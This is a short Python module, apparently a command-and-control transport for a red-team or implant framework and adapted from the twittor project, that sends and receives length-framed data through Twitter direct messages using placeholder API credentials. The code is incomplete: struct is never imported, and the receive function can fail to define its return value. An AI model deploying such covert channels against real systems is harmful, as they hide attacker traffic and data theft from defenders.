# Sample transport that utilizes twitter as a communication channel.
# Most of the code is borrowed with love from https://github.com/PaulSec/twittor/

# TODO, consider if we need to delete DMs or not.

import tweepy

# GHETTO CONFIG SECTION, TO BE EVENTUALLY UPDATED WHEN CONFIG READING IS PATCHED IN

CONSUMER_TOKEN = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
CONSUMER_SECRET = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'

ACCESS_TOKEN = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
ACCESS_TOKEN_SECRET = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'

USERNAME = 'XXXXXXXXXXXXXXXXXXXXXXXX'

def prepTransport():
	global api

	auth = tweepy.OAuthHandler(CONSUMER_TOKEN, CONSUMER_SECRET)
	auth.set_access_token(ACCESS_TOKEN, ACCESS_TOKEN_SECRET)

	# Construct the api instance
	api = tweepy.API(auth)



def sendData(data):
	slen = struct.pack('<I', len(data))
	message = (slen+data)
	api.send_direct_message(user=USERNAME, text=message)


def retrieveData():
	for message in api.direct_messages(count=200, full_text="true"):
		if (message.sender_screen_name == USERNAME):
			try:
				data = message.text[4:] # ignore the frame size
			except:
				data = None
				pass
	return data